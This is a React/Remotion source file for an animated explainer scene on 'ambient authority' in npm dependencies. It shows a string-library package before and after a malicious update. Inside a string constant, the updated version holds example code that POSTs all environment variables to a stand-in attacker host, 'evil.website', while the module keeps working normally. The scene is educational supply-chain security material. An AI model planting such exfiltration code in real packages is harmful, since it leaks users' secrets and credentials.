import React from 'react';
import { AbsoluteFill } from 'remotion';
import { fadeAt, springAt, useClock } from '../components/anim';
import { Code } from '../components/Code';
import { ImpactFlash } from '../components/Effects';
import { SceneShell } from '../components/SceneShell';
import { colors, fonts } from '../theme';
import { SceneHeading } from './Pipeline';

const INNOCENT = `
// just a friendly string library
module.exports = function normalizeUnicode (string) {
  // ...
}
`;

const EVIL = `
// send environment variables to evil lair
fetch('https://evil.website', {
  method: 'POST',
  body: JSON.stringify(process.env),
})

// keep working normally so no one notices
module.exports = function normalizeUnicode (string) {
  // ...
}
`;

const SWAP_AT = 8.25;

export const Ambient: React.FC = () => {
  const { frame, fps } = useClock();
  const swap = springAt(frame, fps, SWAP_AT, { damping: 14 });
  const caption = springAt(frame, fps, 12.5, { damping: 16 });
  return (
    <SceneShell id="ambient" shakes={[{ at: SWAP_AT, amp: 8 }]}>
      <ImpactFlash atSec={SWAP_AT} peak={0.14} />
      <AbsoluteFill style={{ alignItems: 'center', justifyContent: 'center', gap: 48 }}>
        <SceneHeading frame={frame} fps={fps} color={colors.red} at={0.4}>
          #2 — ambient authority
        </SceneHeading>
        <div style={{ position: 'relative', width: 1500, height: 640 }}>
          <div
            style={{
              position: 'absolute',
              left: '50%',
              top: 40,
              transform: `translateX(-50%) translateX(${swap * -395}px) scale(${1 - swap * 0.22})`,
              opacity: fadeAt(frame, fps, 3.2, 0.4) * (1 - swap * 0.55),
            }}
          >
            <Code
              code={INNOCENT}
              title="node_modules/normalize-unicode/index.js"
              fontSize={30}
              typeStartSec={3.4}
              typeDurSec={1.8}
              width={1060}
            />
          </div>
          <div
            style={{
              position: 'absolute',
              left: '50%',
              top: 0,
              transform: `translateX(-50%) translateX(${(1 - swap) * 60 + 240}px)`,
              opacity: swap,
            }}
          >
            <Code
              code={EVIL}
              title="...after a malicious update"
              fontSize={30}
              typeStartSec={8.4}
              typeDurSec={2.6}
              width={1000}
              accent={colors.red}
              lineHighlights={{
                0: 'rgba(236,39,58,0.16)',
                1: 'rgba(236,39,58,0.16)',
                2: 'rgba(236,39,58,0.16)',
                3: 'rgba(236,39,58,0.16)',
                4: 'rgba(236,39,58,0.16)',
              }}
            />
          </div>
        </div>
        <div
          style={{
            fontFamily: fonts.heading,
            opacity: caption,
            transform: `translateY(${(1 - caption) * 30}px)`,
            color: colors.gray,
            fontSize: 42,
            fontWeight: 600,
            textAlign: 'center',
          }}
        >
          same powers as your own code —{' '}
          <span style={{ color: colors.red, fontWeight: 800 }}>
            no permission required
          </span>
        </div>
      </AbsoluteFill>
    </SceneShell>
  );
};
